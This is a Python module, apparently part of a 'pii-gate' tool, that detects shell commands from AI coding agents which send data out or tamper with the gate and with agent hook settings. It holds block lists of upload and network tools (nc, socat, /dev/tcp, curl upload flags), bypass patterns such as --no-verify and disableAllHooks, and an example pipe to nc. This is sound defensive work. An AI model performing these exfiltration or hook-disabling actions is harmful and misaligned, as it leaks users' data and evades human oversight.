"""Exfiltration and tamper rules for shell commands and file paths.

The command line is split into segments (at `|`, `;`, `&&`, `||`, `&`, newlines, parentheses) and
every rule looks at the word in *command position* of a segment, not at a regex over the whole
line. That is what makes `grep HttpClient src/` or `git commit -m "fix clip alignment"` harmless
while `cat p.csv | nc host 9` is not, and it keeps every check linear in the length of the command:
nothing here scans "to the end of the line" from each candidate.

Commands are matched after light de-obfuscation (quotes inside words, backslashes and PowerShell
backticks before letters, `${IFS}`, empty `${VAR}` expansions, string concatenation), because the
shell removes those before it runs the command and the gate must see what the shell sees.
"""
from __future__ import annotations

import posixpath
import re
from typing import Iterator, List, Optional, Tuple

from .detectors import Finding

# --------------------------------------------------------------------------- normalisation
_DOLLAR_QUOTE = re.compile(r"\$'([^']*)'")
_WORD_QUOTES = re.compile(r"""(?<!\\)(["'])([A-Za-z0-9_@./:=+%{}-]*)\1""")    # 'curl', cu""rl, cur'l', -d'@f'; not 'it'\''s'
_CONCAT = re.compile(r"""["']\s*\+\s*["']""")                            # '.pii-'+'gate.json'
_IFS = re.compile(r"\$\{IFS\}|\$IFS\b")
_ENV_SPLIT = re.compile(r"""(\benv\s+(?:-\S+\s+)*?)(?:-S|--split-string[= ])\s*(["'])(.*?)\2""")  # env -S "curl -d x"
_EMPTY_VAR = re.compile(r"\$\{\w{1,3}\}")                                 # c${u}rl
_ESCAPED_LETTER = re.compile(r"[\\`]([A-Za-z])")                          # c\url, Remove-`Item


_ASSIGNMENT = re.compile(r"(?:^|[\s;&|(])([A-Za-z_]\w*)=(\$\([^)]*\)|\"[^\"]*\"|'[^']*'|[^\s;&|()]+)")


def normalize(command: str) -> str:
    """What the shell will execute, roughly: strip word-internal quoting tricks and expand the
    variables the command itself assigns (`u=u; c${u}rl`, `D=$(cat f); curl $D`)."""
    s = _DOLLAR_QUOTE.sub(r"\1", command)
    s = _CONCAT.sub("", s)
    s = _WORD_QUOTES.sub(r"\2", s)
    s = _IFS.sub(" ", s)
    if "-S" in s or "--split-string" in s:
        s = _ENV_SPLIT.sub(r"\1\3", s)              # env splits the string into words: same line without the quotes
    assigned ={m.group(1): m.group(2).strip("\"'") for m in _ASSIGNMENT.finditer(s)}
    if assigned:
        names = "|".join(sorted(map(re.escape, assigned), key=len, reverse=True))
        s = re.sub(r"\$\{(" + names + r")\}|\$(" + names + r")\b",
                   lambda m: assigned[m.group(1) or m.group(2)], s)
    s = _EMPTY_VAR.sub("", s)
    s = _ESCAPED_LETTER.sub(r"\1", s)
    return s


# --------------------------------------------------------------------------- segments
# Programs that run the command that follows them, with the options of theirs that take a separate value
# word (`sudo -u root`, `nice -n 10`). Any other option is skipped on its own, `--` ends the options, and
# a few take positional arguments before the command (the duration of `timeout`, the lock file of `flock`).
_WRAPPER_VALUE_FLAGS = {
    "sudo": frozenset(("-u", "-g", "-C", "-D", "-h", "-p", "-r", "-t", "-T", "-R", "-U", "-a", "-c", "--user", "--group",
                       "--close-from", "--chdir", "--host", "--prompt", "--role", "--type", "--command-timeout",
                       "--chroot", "--other-user", "--auth-type", "--class")),
    "doas": frozenset(("-u", "-C", "-a")),
    "env": frozenset(("-u", "-C", "-P", "-a", "--unset", "--chdir", "--argv0")),
    "nice": frozenset(("-n", "--adjustment")),
    "ionice": frozenset(("-c", "-n", "-p", "-P", "-u", "--class", "--classdata", "--pid", "--pgid", "--uid")),
    "timeout": frozenset(("-s", "-k", "--signal", "--kill-after")),
    "time": frozenset(("-f", "-o", "--format", "--output")),
    "exec": frozenset(("-a",)),
    "stdbuf": frozenset(("-i", "-o", "-e", "--input", "--output", "--error")),
    "xargs": frozenset(("-n", "-P", "-L", "-I", "-E", "-s", "-a", "-d", "-J", "-R", "-S", "--max-args", "--max-procs",
                        "--max-chars", "--arg-file", "--delimiter", "--process-slot-var")),
    "flock": frozenset(("-w", "-E", "--timeout", "--wait", "--conflict-exit-code")),
    "chrt": frozenset(("-T", "-P", "-D", "--sched-runtime", "--sched-period", "--sched-deadline")),
    "watch": frozenset(("-n", "-q", "--interval", "--equexit")),
    "nsenter": frozenset(("-t", "-S", "-G", "--target", "--setuid", "--setgid")),
    "unshare": frozenset(("-R", "-w", "-S", "-G", "--root", "--wd", "--setuid", "--setgid", "--propagation",
                          "--setgroups", "--map-user", "--map-group", "--map-users", "--map-groups", "--monotonic",
                          "--boottime")),
    "chroot": frozenset(("-u", "-g", "-G", "--userspec", "--groups")),
    "caffeinate": frozenset(("-t", "-w")),
    "arch": frozenset(("-arch", "-e", "-d")),
    "strace": frozenset(("-e", "-o", "-p", "-s", "-u", "-E", "-P", "-a", "-b", "-I", "-O", "-S", "-U", "-X", "--trace",
                         "--output", "--attach", "--string-limit", "--user", "--env", "--signal", "--read", "--write",
                         "--inject", "--fault")),
    "ltrace": frozenset(("-a", "-A", "-e", "-F", "-l", "-n", "-o", "-p", "-s", "-u", "-w", "-x")),
    "runuser": frozenset(("-u", "-g", "-G", "-s", "-w", "--user", "--group", "--supp-group", "--shell")),
    "pkexec": frozenset(("-u", "--user")),
    "parallel": frozenset(("-j", "-a", "-S", "-I", "-N", "-n", "-L", "-C", "--jobs", "--arg-file", "--sshlogin",
                           "--replace", "--max-args", "--max-lines", "--colsep", "--delimiter")),
    "watchexec": frozenset(("-w", "-e", "-f", "-i", "-E", "-d", "--watch", "--exts", "--filter", "--ignore", "--env",
                            "--debounce", "--shell")),
    "systemd-run": frozenset(("-u", "-p", "-E", "--unit", "--property", "--setenv", "--uid", "--gid",
                              "--working-directory", "--description", "--slice")),
    "proot": frozenset(("-r", "-b", "-w", "-S", "-q", "-k")),
    "wsl": frozenset(("-d", "-u", "--distribution", "--user", "--cd", "--shell-type")),
    "entr": frozenset(),
    "setsid": frozenset(), "nohup": frozenset(), "command": frozenset(), "busybox": frozenset(),
    "unbuffer": frozenset(), "taskset": frozenset(),
}
# Short options that take an optional value, which must be glued on (xargs -i{}); a bundle stops at one.
_WRAPPER_OPTIONAL_SHORT = {"xargs": "iel", "nsenter": "muinpCUTrw"}
_WRAPPER_NO_BUNDLE = frozenset(("arch",))               # its options are single-dash words: -arm64e, -x86_64
_WRAPPER_POSITIONAL = {"timeout": 1, "taskset": 1, "flock": 1, "chrt": 1, "chroot": 1}
_QUOTES = "\"'"
_LOOKUP_TOOLS = frozenset(("echo", "printf", "which", "whereis", "type", "man", "help", "info", "apropos", "whatis"))
_PREFIX =frozenset(_WRAPPER_VALUE_FLAGS) | frozenset(("do", "then", "else", "elif", "if", "while", "until", "{", "!"))
_ASSIGN = re.compile(r"^[A-Za-z_]\w*=")
_FLAG = re.compile(r"^-")


class Segment:
    __slots__ = ("text", "start", "piped", "tool", "tool_pos", "words")

    def __init__(self, text: str, start: int, piped: bool):
        self.text = text
        self.start = start
        self.piped = piped
        self.words = text.split()
        self.tool, self.tool_pos = _command_word(self.words)


def _basename(word: str) -> str:
    name = word.replace("\\", "/").rpartition("/")[2].lower()
    return name[:-4] if name.endswith(".exe") else name


def _name(word: str) -> str:
    return _basename(word.strip(_QUOTES))


def _after_word(words: List[str], i: int) -> int:
    """Index after the word at words[i]; a quoted string with spaces in it (FOO="a b", --prompt="a b",
    'it'\\''s') spans several of the split words."""
    quote, n = "", len(words)
    while i < n:
        w = words[i]
        i += 1
        if '"' in w or "'" in w:
            k = 0
            while k < len(w):
                ch = w[k]
                if quote:
                    if ch == quote:
                        quote = ""
                    elif ch == "\\" and quote == '"':
                        k += 1
                elif ch == "\\":
                    k += 1
                elif ch in _QUOTES:
                    quote = ch
                k += 1
        if not quote:
            break
    return i


def _skip_options(words: List[str], i: int, wrapper: str) -> Tuple[int, bool]:
    """Index of the first word after the options, `NAME=value` words and positional arguments of `wrapper`,
    which starts at words[i - 1], and whether it had any option or positional argument."""
    value_flags = _WRAPPER_VALUE_FLAGS.get(wrapper, frozenset())
    optional = _WRAPPER_OPTIONAL_SHORT.get(wrapper, "")
    n, flagged = len(words), False
    while i < n:
        w = words[i].strip(_QUOTES)
        if w == "--":
            i += 1
            break
        if _ASSIGN.match(w):
            i = _after_word(words, i)
            continue
        if not _FLAG.match(w):
            break
        flagged = True
        if wrapper == "command" and ("v" in w or "V" in w):     # command -v scp only looks the program up
            return n, True
        i = _after_word(words, i)
        takes_value = w in value_flags
        if not takes_value and w[1:2] != "-" and wrapper not in _WRAPPER_NO_BUNDLE:
            for k, c in enumerate(w[1:], 1):                    # bundled short options: -Hu root, -0n 1, -uroot
                if not c.isalnum() or c in optional:
                    break
                if "-" + c in value_flags:
                    takes_value = k == len(w) - 1
                    break
        if takes_value and i < n:
            i = _after_word(words, i)
    for _ in range(_WRAPPER_POSITIONAL.get(wrapper, 0)):
        if i < n:
            i, flagged = _after_word(words, i), True
    return i, flagged


def _command_word(words: List[str]) -> Tuple[str, int]:
    """(tool name, index) of the word in command position, after wrapper programs such as `sudo -u root`,
    `env -i A=b`, `nice -n 10`, `timeout 5s` and `xargs -n 1` with their options."""
    i, n = 0, len(words)
    skipped = False
    while i < n:
        if _ASSIGN.match(words[i].strip(_QUOTES)):              # before the name test: LOCK=/tmp/flock is no wrapper
            i = _after_word(words, i)
        elif _name(words[i]) in _PREFIX:
            i, found = _skip_options(words, i + 1, _name(words[i]))
            skipped = skipped or found
        else:
            break
    if i >= n:
        return "", -1
    # An option missing from the tables above would leave its value in command position. Fail closed: when
    # options were skipped and the word there is no known tool but the next one is, that one is the command,
    # unless the word there only prints or looks up its arguments (`sudo -n which scp`) or the next word is
    # a path (`nice -n 10 cat /tmp/scp`).
    if (skipped and _name(words[i]) not in _WATCHED and _name(words[i]) not in _LOOKUP_TOOLS
            and i + 1 < n and _name(words[i + 1]) in _WATCHED and not re.search(r"[\\/]", words[i + 1])):
        i += 1
    return _name(words[i]), i


# --------------------------------------------------------------------------- command strings
# Programs that run a command line given as a string. A shell takes it after -c (`bash -lc "..."`); `su`,
# `runuser`, `script` and `flock` take it after -c / --command wherever that stands among their words.
_SHELLS = frozenset(("sh", "bash", "zsh", "dash", "ksh", "mksh", "ash", "csh", "tcsh", "fish", "nu", "xonsh", "elvish"))
_STRING_FLAG_TOOLS = frozenset(("su", "runuser", "script", "flock", "sg", "npx", "npm"))
_STRING_FLAG_POSITIONAL = {"flock": 1, "npx": 0, "npm": 0}     # the lock file; the program npx runs
_FLAG_STRING_VALUES = {"flock": frozenset(("-w", "-E", "--timeout", "--wait", "--conflict-exit-code")),
                       "su": frozenset(("-s", "-g", "-G", "-w", "--shell", "--group", "--supp-group")),
                       "runuser": frozenset(("-u", "-g", "-G", "-s", "-w", "--user", "--group", "--shell"))}
_LAUNCHERS = _SHELLS | _STRING_FLAG_TOOLS | frozenset(("eval", "cmd", "powershell", "pwsh", "find", "gfind"))
_FIND_EXEC = frozenset(("-exec", "-execdir", "-ok", "-okdir"))
_FIND_END = frozenset((";", "\\;", "';'", '";"', "+"))
_MAX_NESTING = 3


def _dequote(text: str) -> str:
    """The argument a shell word stands for: quotes removed, `\\"`, `\\\\`, `\\$` and `\\`` undone inside double quotes,
    a backslash outside quotes keeping the next character."""
    out: List[str] = []
    quote = ""
    k, n = 0, len(text)
    while k < n:
        ch = text[k]
        if quote == "'":
            if ch == "'":
                quote = ""
            else:
                out.append(ch)
        elif quote == '"':
            if ch == '"':
                quote = ""
            elif ch == "\\" and k + 1 < n and text[k + 1] in '"\\$`':
                k += 1
                out.append(text[k])
            else:
                out.append(ch)
        elif ch in _QUOTES:
            quote = ch
        elif ch == "\\" and k + 1 < n:
            k += 1
            out.append(text[k])
        else:
            out.append(ch)
        k += 1
    return "".join(out)


def _string_after(words: List[str], i: int) -> str:
    """The one argument that starts at words[i]."""
    return _dequote(" ".join(words[i:_after_word(words, i)])) if i < len(words) else ""


def _args_after(words: List[str], i: int) -> str:
    """The arguments from words[i] on, each unquoted, joined by spaces (what `eval` makes a command line of)."""
    args: List[str] = []
    while i < len(words):
        j = _after_word(words, i)
        args.append(_dequote(" ".join(words[i:j])))
        i = j
    return " ".join(args)


def _shell_string(words: List[str], i: int) -> List[str]:
    """The string after the -c of a shell, whose options start at words[i]: -c may be bundled (-lc, -ec), and
    -o / -O take a value, either the rest of the word or the next word (-eo pipefail). The first word that is not
    an option is a script file."""
    n = len(words)
    while i < n:
        w = words[i]
        if len(w) < 2 or w[0] not in "-+" or w == "--":
            break
        if w.startswith("--"):
            i += 2 if w in ("--rcfile", "--init-file") else 1
            continue
        for k, c in enumerate(w[1:], 1):
            if c == "c" and w[0] == "-":
                return [_string_after(words, i + 1)]
            if c in "oO":
                i += 1 if k < len(w) - 1 else 2
                break
        else:
            i += 1
    return []


def _flag_string(words: List[str], i: int, tool: str) -> List[str]:
    """The string after -c / --command / --session-command / --call of `su`, `runuser`, `script`, `flock`, `sg`,
    `npx` and `npm exec`, wherever it stands among their words, up to the point where their own arguments end."""
    n = len(words)
    free = _STRING_FLAG_POSITIONAL.get(tool, 99)                # words before the string flag that are no options
    while i < n:
        w = words[i]
        if w == "--":
            break
        if w.startswith("--"):
            name, eq, _ = w.partition("=")
            if name in ("--command", "--session-command", "--call"):
                if eq:
                    return [_dequote(" ".join(words[i:_after_word(words, i)]).partition("=")[2])]
                return [_string_after(words, i + 1)]
            i += 2 if name in _FLAG_STRING_VALUES.get(tool, ()) and not eq else 1
        elif w[:1] == "-" and len(w) > 1:
            if w in _FLAG_STRING_VALUES.get(tool, ()):
                i += 2
                continue
            k = w.find("c", 1)                                  # -c, -lc, -qec: the string is the next word
            if k > 0:
                glued = [w[k + 1:]] + words[i + 1:] if w[k + 1:] else []     # su -c"id": the string is part of the word
                return [_dequote(" ".join(glued[:_after_word(glued, 0)]))] if glued else [_string_after(words, i + 1)]
            i += 1
        elif tool == "npm" and w in ("exec", "x"):
            i += 1
        elif free == 0:
            break
        else:
            free -= 1
            i += 1
    return []


def _nested_commands(seg: Segment) -> List[str]:
    """Command lines a segment hands to another shell: the string of `sh -c`, `su -c`, `flock -c` or `script -c`,
    what `eval`, `cmd /c` and `powershell -Command` run, and the commands of `find -exec`."""
    words, n = seg.words, len(seg.words)
    if seg.tool_pos < 0 or (seg.tool_pos == 0 and seg.tool not in _LAUNCHERS):
        return []
    for j in range(seg.tool_pos + 1):                           # runuser is a wrapper: its user name is the "tool"
        if _name(words[j]) in _LAUNCHERS:
            break
    else:
        return []
    tool, i = _name(words[j]), j + 1
    if tool in _SHELLS:
        return _shell_string(words, i)
    if tool in _STRING_FLAG_TOOLS:
        return _flag_string(words, i, tool)
    if tool == "eval":
        return [_args_after(words, i)] if i < n else []
    if tool == "cmd":
        for j in range(i, n):
            if words[j].lower() in ("/c", "/k", "/r"):
                return [_args_after(words, j + 1)]
    elif tool in ("powershell", "pwsh"):
        for j in range(i, n):
            low = words[j].lower()
            if len(low) > 1 and "-command".startswith(low):
                return [_args_after(words, j + 1)]
    elif tool in ("find", "gfind"):
        out: List[str] = []
        j = i
        while j < n:
            if words[j] in _FIND_EXEC:
                k = j + 1
                while k < n and words[k] not in _FIND_END:
                    k += 1
                out.append(" ".join(words[j + 1:k]))
                j = k
            j += 1
        return out
    return []


def segments(command: str, _depth: int = 0) -> List[Segment]:
    """Split at shell separators outside quotes. One linear pass; inline code such as
    `python -c "import requests; requests.post(...)"` stays one segment. The command lines that a segment
    hands to another shell (`bash -c "..."`, `eval`, `find -exec`) are split the same way and added."""
    out: List[Segment] = []
    start = 0
    piped = False
    quote = ""
    i, n = 0, len(command)

    def flush(end: int, next_piped: bool) -> None:
        nonlocal start, piped
        part = command[start:end]
        if part.strip():
            out.append(Segment(part, start, piped))
        piped = next_piped

    while i < n:
        ch = command[i]
        if quote:
            if ch == quote:
                quote = ""
            elif ch == "\\" and quote == '"':
                i += 1
        elif ch in "\"'":
            quote = ch
        elif ch == "\\":
            i += 1
        elif ch in "|&":
            two = command[i:i + 2]
            flush(i, ch == "|")
            i += 2 if two in ("||", "&&") else 1
            start = i
            continue
        elif ch in ";\n()":
            flush(i, False)
            start = i + 1
        i += 1
    flush(n, False)
    if _depth < _MAX_NESTING:
        for seg in list(out):
            for inner in _nested_commands(seg):
                nested = segments(inner, _depth + 1)
                for sub in nested:
                    sub.start = seg.start
                if nested:
                    nested[0].piped = nested[0].piped or seg.piped
                out.extend(nested)
    return out


# --------------------------------------------------------------------------- outbound tools
# Command-position names. Transfers that always carry data out:
_UPLOAD_TOOLS = frozenset((
    "scp", "sftp", "pscp", "psftp", "rsync", "rclone", "start-bitstransfer", "bitsadmin", "ftp", "lftp", "tftp",
    "smbclient", "ncftpput", "s3cmd", "mail", "mailx", "sendmail", "msmtp", "mutt", "swaks", "send-mailmessage",
    "clip", "pbcopy", "xclip", "xsel", "wl-copy", "set-clipboard", "ngrok", "cloudflared", "localtunnel", "lt",
    "bore", "telebit", "serveo",
))
# Tools whose sub-command decides: {tool: regex over the rest of the segment}
_UPLOAD_SUBCOMMANDS = {
    "aws": re.compile(r"^\s*(?:s3\s+(?:cp|sync|mv)|s3api\s+(?:put-object|upload-part)(?![\w-])|sns\s+publish|ses\s+send-\w*email"
                      r"|sqs\s+send-message|lambda\s+invoke|secretsmanager\s+put-secret-value)\b", re.I),
    "gsutil": re.compile(r"^\s*(?:cp|rsync|mv)\b", re.I),
    "gcloud": re.compile(r"^\s*(?:storage\s+(?:cp|rsync|mv)|pubsub\s+topics\s+publish|functions\s+call)\b", re.I),
    "az": re.compile(r"^\s*storage\s+(?:blob|file)\s+upload", re.I),
    "azcopy": re.compile(r"^\s*(?:copy|cp|sync)\b", re.I),
    "mc": re.compile(r"^\s*(?:cp|mirror|put|pipe)\b", re.I),
    "b2": re.compile(r"^\s*(?:upload-file|file\s+upload)\b", re.I),
    "gh": re.compile(r"^\s*(?:gist\s+create|release\s+(?:create|upload)|(?:issue|pr)\s+(?:create|comment)\b.*--body-file"
                     r"|api\b.*(?:-X\s*(?:POST|PUT|PATCH)|--method\s*(?:POST|PUT|PATCH)|\s-[fF]\s|--input))", re.I),
    "glab": re.compile(r"^\s*(?:snippet\s+create|release\s+(?:create|upload))\b", re.I),
    "npm": re.compile(r"^\s*publish\b", re.I), "yarn": re.compile(r"^\s*(?:npm\s+)?publish\b", re.I),
    "pnpm": re.compile(r"^\s*publish\b", re.I), "twine": re.compile(r"^\s*upload\b", re.I),
    "docker": re.compile(r"^\s*push\b", re.I), "kubectl": re.compile(r"^\s*cp\b", re.I),
    "tailscale": re.compile(r"^\s*(?:funnel|serve)\b", re.I),
    "python": re.compile(r"^\s*-m\s+http\.server\b", re.I), "python3": re.compile(r"^\s*-m\s+http\.server\b", re.I),
    "ssh": re.compile(r"(?:^|\s)-[A-Za-z]*R\b"),
    "bitsadmin": re.compile(r"/upload", re.I),
}
# Network clients: fine for downloads, not when they send a body, read a file or are fed from a pipe.
_OUTBOUND_TOOLS = frozenset((
    "curl", "wget", "http", "https", "xh", "xhs", "iwr", "irm", "invoke-webrequest", "invoke-restmethod",
    "nc", "ncat", "netcat", "socat", "ssh", "openssl", "telnet", "nslookup", "dig", "ping", "xdg-open",
    "start-process", "httpie", "aria2c",
))
_HTTPIE = frozenset(("http", "https", "xh", "xhs", "httpie"))
# curl/wget/PowerShell flags that send a body or a file. The short-flag bundle is case sensitive
# (-f is "fail", -D dumps headers) and allows a glued argument (-Ffile=@x, -Tfile).
_SHORT_UPLOAD_FLAG = re.compile(r"(?:^|\s)(?:-[A-Za-z]{0,3}[dF]\S*|-T(?!\s*\d)\S*|-H\s*@)")   # curl/wget only, case sensitive
_UPLOAD_FLAG = re.compile(
    r"(?:^|\s)(?:--data(?:-binary|-raw|-urlencode|-ascii)?\b|--form(?:-string)?\b|--upload-file\b|--json\b|--config\b|-K\b"
    r"|--url-query\b|--variable\b|--expand-\w+|--post-data\b|--post-file\b|--body-data\b|--body-file\b"
    r"|--method[= ]?(?:POST|PUT|PATCH)\b|-X\s*(?:POST|PUT|PATCH)\b|--request[= ]?(?:POST|PUT|PATCH)\b"
    r"|-InF\w*|-Bo\w*|-Me\w*\s+(?:Post|Put|Patch)\b)", re.I)
_HTTPIE_UPLOAD = re.compile(
    r"(?:^|\s)(?:POST|PUT|PATCH|--form|--multipart|--raw|-f|--offline|-[A-Za-z]*f[A-Za-z]*)(?=\s|$)"
    r"|(?:^|\s)[^\s:=@-][^\s:=@]*(?::=|=)?@\S", re.I)
_URL = re.compile(r"https?://([^/\s:\"']+)", re.I)
_LOCAL_HOSTS = frozenset(("localhost", "127.0.0.1", "0.0.0.0", "::1", "[::1]", "host.docker.internal"))
_DEV_TCP = re.compile(r"/dev/(?:tcp|udp)/", re.I)
_SUBSTITUTION = re.compile(r"\$\(|`")
# Inline code run by an interpreter, and the network calls inside it.
_INTERPRETERS = frozenset(("python", "python3", "python2", "py", "pypy", "pypy3", "node", "nodejs", "deno", "bun",
                           "ruby", "perl", "php", "pwsh", "powershell", "powershell_ise"))
_INLINE_FLAG = re.compile(r"(?:^|\s)(?:-c|-e|-r|-p|-E|-Command|-c(?:ommand)?|-enc(?:odedcommand)?|-ec|-)(?=\s|$)", re.I)
_ENCODED = re.compile(r"(?:^|\s)-(?:enc|encodedcommand|ec|e)(?=\s)\s+[A-Za-z0-9+/=]{16,}", re.I)
_CODE_NET = re.compile(
    r"urlopen\s*\(|urllib\.request|urllib3|requests\.\w+\s*\(|httpx\.|aiohttp|http\.client|\bsocket\.(?:socket|create_connection)"
    r"|\.sendall\s*\(|\.sendto\s*\(|smtplib|ftplib|paramiko|boto3|pysftp|\bfetch\s*\(|https?\.request\s*\(|XMLHttpRequest|axios"
    r"|net\.(?:connect|createconnection|socket)|dgram|Net\.WebClient|HttpClient|Invoke-(?:WebRequest|RestMethod)\b|iwr\b|irm\b"
    r"|Send-MailMessage|System\.Net|Net\.Sockets|Upload(?:String|File|Data|Values)\s*\(|(?:Post|Put|Patch|Send)Async\s*\(", re.I)
_DOTNET_INLINE = re.compile(r"::|New-Object\b|^\s*[\[$(]")

# --------------------------------------------------------------------------- git push
_GIT_PUSH = re.compile(r"^(?:\s+-[Cc]\s+\S+|\s+--?[\w-]+(?:=\S+)?)*\s+(?:push|svn\s+dcommit|send-email)\b", re.I)

# --------------------------------------------------------------------------- tamper
# Files that configure the gate or the agents' hooks, Python start-up files, and git hook files.
# Shell globs (.pii-g*.json, set*.json) are matched too.
_GATE_FILES = re.compile(
    r"\.pii-g[\w*?.-]*\.json|\.pii-gate(?![\w-])"
    r"|\.codex[\\/]+(?:hook[\w*?]*\.json|conf[\w*?]*\.toml)"
    r"|\.claude[\\/]+set[\w*?.]*\.json|(?:^|[\s\"'=/\\])\.claude\.json(?![\w-])|managed-settings"
    r"|\.gemini[\\/]+set[\w*?]*\.json"
    r"|(?<![\w-])(?<!\w/)(?<!\w\\)pii_gate(?:[\\/]|\.py\b)|\bpii_gate\.installer\b|\bimport\s+installer\b"
    r"|(?:site|user)customize\.py|(?:site|dist)-packages[\\/][^\s\"']*\.pth"
    r"|\.git[\\/]+hooks[\\/]|\.pre-commit-config\.ya?ml", re.I)
_GATE_DIRS = re.compile(r"(?<![\w-])\.(?:codex|claude|gemini|pii-gate)(?=[\s\"'/\\]|$)", re.I)
_DESTRUCTIVE = frozenset(("rm", "rmdir", "rd", "del", "erase", "mv", "move", "ren", "rename", "chmod", "chown",
                          "chattr", "attrib", "icacls", "takeown", "remove-item", "move-item", "rename-item",
                          "set-acl", "ri", "rni", "mi"))
_READ_ONLY_TOOLS = frozenset(("cat", "type", "less", "more", "head", "tail", "bat", "grep", "rg", "findstr", "ls",
                              "dir", "stat", "wc", "diff", "jq", "file", "md5sum", "sha256sum", "get-content", "gc",
                              "select-string", "get-item", "get-childitem", "get-filehash", "test-path",
                              "format-hex", "pii-gate", "python", "python3"))
_READ_ONLY_GIT = re.compile(r"^\s*(?:diff|status|log|show|blame)\b", re.I)
_WRITE_WORDS = re.compile(r"(?:^|\s)(?:--output(?:=|\s)|-o(?=\s|$)|>|<|\$\(|`)")
_BYPASS = re.compile(
    r"PII_GATE_\w+[\"'\]]*\s*[=:]|--dangerously-bypass-hook-trust|\b(?:codex_)?hooks\s*=\s*false"
    r"|disableAllHooks|allow_managed_hooks_only|--no-verify|core\.hooksPath|installer\.uninstall\b|/hooks\s+disable", re.I)
_PKG_TOOLS = frozenset(("pip", "pip3", "pip2", "pipx", "uv", "poetry", "pdm", "conda"))
_PKG_VERBS = frozenset(("uninstall", "install", "remove", "add"))
_PKG_TARGET = re.compile(r"pii[-_]gate", re.I)
# Every tool the rules look at; see _command_word.
_WATCHED = (_UPLOAD_TOOLS | _OUTBOUND_TOOLS | _INTERPRETERS | _DESTRUCTIVE | _PKG_TOOLS | frozenset(_UPLOAD_SUBCOMMANDS)
            | frozenset(("git", "hub", "pii-gate", "claude", "codex", "gemini")))


def _hosts_all_local(text: str) -> bool:
    hosts = [h.lower().rstrip(".") for h in _URL.findall(text)]
    return bool(hosts) and all(h in _LOCAL_HOSTS for h in hosts)


def _rest(seg: Segment) -> str:
    return " ".join(seg.words[seg.tool_pos + 1:])


def find_git_push(command: str) -> Iterator[Finding]:
    for seg in segments(normalize(command)):
        if seg.tool in ("git", "hub"):
            rest = " " + _rest(seg)
            if (seg.tool == "hub" and re.match(r"\s+push\b", rest)) or (seg.tool == "git" and _GIT_PUSH.match(rest)):
                yield Finding("git-push", seg.start, seg.start + len(seg.text), "git push",
                              "the agent must not publish; you push")
                return


def find_exfil(command: str, has_sensitive: bool) -> Iterator[Finding]:
    """Outbound transfer. Downloads are fine; uploads, or any outbound call that carries data, are not."""
    norm = normalize(command)
    segs = segments(norm)
    if _DEV_TCP.search(norm):
        m = _DEV_TCP.search(norm)
        yield Finding("exfil", m.start(), m.end(), mask_cmd(m.group()), "raw socket redirection")
        return
    substitution_anywhere = bool(_SUBSTITUTION.search(command))
    redirect_anywhere = "<" in norm
    for seg in segs:
        tool, rest = seg.tool, _rest(seg)
        if not tool:
            continue
        where = (seg.start, seg.start + len(seg.text), mask_cmd(seg.words[seg.tool_pos]))
        if tool in _UPLOAD_TOOLS:
            yield Finding("exfil", *where, "file transfer command")
            return
        sub = _UPLOAD_SUBCOMMANDS.get(tool)
        if sub and sub.search(rest):
            yield Finding("exfil", *where, "file transfer command")
            return
        if tool in _INTERPRETERS or _DOTNET_INLINE.search(seg.text):
            if tool in _INTERPRETERS and _ENCODED.search(rest):
                yield Finding("exfil", *where, "encoded command")
                return
            inline = tool not in _INTERPRETERS or _INLINE_FLAG.search(" " + rest) or "<<" in norm or seg.piped
            if inline and _CODE_NET.search(seg.text):
                yield Finding("exfil", *where, "network call in inline code")
                return
        if tool in _OUTBOUND_TOOLS:
            if has_sensitive:
                yield Finding("exfil", *where, f"{tool} with outbound call carrying sensitive data")
                return
            if seg.piped:
                yield Finding("exfil", *where, f"{tool} fed from a pipe")
                return
            if redirect_anywhere or substitution_anywhere:
                yield Finding("exfil", *where, f"{tool} fed from a file or a sub-command")
                return
            if tool in _HTTPIE:
                flagged = _HTTPIE_UPLOAD.search(" " + rest)
            elif tool in ("curl", "wget", "aria2c"):
                flagged = _UPLOAD_FLAG.search(" " + rest) or _SHORT_UPLOAD_FLAG.search(" " + rest)
            else:
                flagged = _UPLOAD_FLAG.search(" " + rest)
            if flagged and not _hosts_all_local(seg.text):
                yield Finding("exfil", *where, f"{tool} with upload flag")
                return


def _is_read_only(segs: List[Segment]) -> bool:
    """A single read-only command may mention a gate file (cat, jq, git diff ...)."""
    if len(segs) != 1 or _WRITE_WORDS.search(segs[0].text):
        return False
    seg = segs[0]
    if seg.tool == "git":
        return bool(_READ_ONLY_GIT.match(_rest(seg)))
    if seg.tool in ("python", "python3"):
        return bool(re.match(r"^\s*-m\s+pii_gate\s+(?:check|status|scan)\b", _rest(seg)))
    if seg.tool == "pii-gate":
        return bool(re.match(r"^\s*(?:check|status|scan)\b", _rest(seg)))
    return seg.tool in _READ_ONLY_TOOLS


def find_tamper(command: str) -> Iterator[Finding]:
    norm = normalize(command)
    segs = segments(norm)
    m = _BYPASS.search(norm)
    if m:
        yield Finding("tamper", m.start(), m.end(), mask_cmd(m.group()), "attempt to bypass or remove the gate")
        return
    for seg in segs:
        rest = _rest(seg)
        if (seg.tool == "pii-gate" and re.match(r"^\s*uninstall\b", rest)) or (
                seg.tool in ("python", "python3", "py") and re.match(r"^\s*-m\s+pii_gate\s+uninstall\b", rest)):
            yield Finding("tamper", seg.start, seg.start + len(seg.text), mask_cmd(seg.words[seg.tool_pos]),
                          "attempt to bypass or remove the gate")
            return
        if seg.tool in _PKG_TOOLS and _PKG_TARGET.search(seg.text) and any(w.lower() in _PKG_VERBS for w in seg.words):
            yield Finding("tamper", seg.start, seg.start + len(seg.text), mask_cmd(seg.words[seg.tool_pos]),
                          "attempt to bypass or remove the gate")
            return
        if seg.tool in ("claude", "codex", "gemini") and any(w == "--bare" for w in seg.words):
            yield Finding("tamper", seg.start, seg.start + len(seg.text), mask_cmd(seg.words[seg.tool_pos]),
                          "attempt to bypass or remove the gate")
            return
    m = _GATE_FILES.search(norm)
    if m and not _is_read_only(segs):
        yield Finding("tamper", m.start(), m.end(), mask_cmd(m.group()),
                      "command touches the gate's own configuration")
        return
    for seg in segs:
        if seg.tool in _DESTRUCTIVE and _GATE_DIRS.search(seg.text):
            yield Finding("tamper", seg.start, seg.start + len(seg.text), mask_cmd(seg.words[seg.tool_pos]),
                          "destructive command on an agent configuration directory")
            return


_NTFS_TAIL = re.compile(r"(?:::\$data)?[. ]*$", re.I)
_STARTUP_FILES = ("sitecustomize.py", "usercustomize.py")


def tamper_path(path: str, cwd: Optional[str] = None) -> bool:
    """True if a file path belongs to the gate, the agents' hook configuration, or a Python
    start-up location from which a module in the working directory could shadow the gate.
    NTFS drops trailing dots, spaces and `::$DATA`, so those are stripped before comparing."""
